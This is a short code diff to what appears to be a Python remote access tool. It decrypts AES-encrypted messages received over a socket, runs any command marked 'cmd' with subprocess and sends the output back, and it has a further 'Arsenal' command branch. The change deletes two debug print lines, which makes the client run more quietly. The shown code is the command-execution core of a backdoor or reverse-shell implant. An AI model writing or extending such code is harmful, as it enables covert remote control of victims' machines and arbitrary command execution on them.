@@ -24,7 +24,6 @@ def do_decrypt(ciphertext):
     obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
     message = obj2.decrypt(ciphertext)
     message = message[:-message[-1]]
-    print(message)
     return message
 
 def main():
@@ -39,7 +38,6 @@ def main():
             command = [ str(x, 'utf-8') for x in received ]
             if 'cmd' in command:
                 del command[0]
-                print(command)
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                 sendit(s, output.stdout)
             elif 'Arsenal' in command:
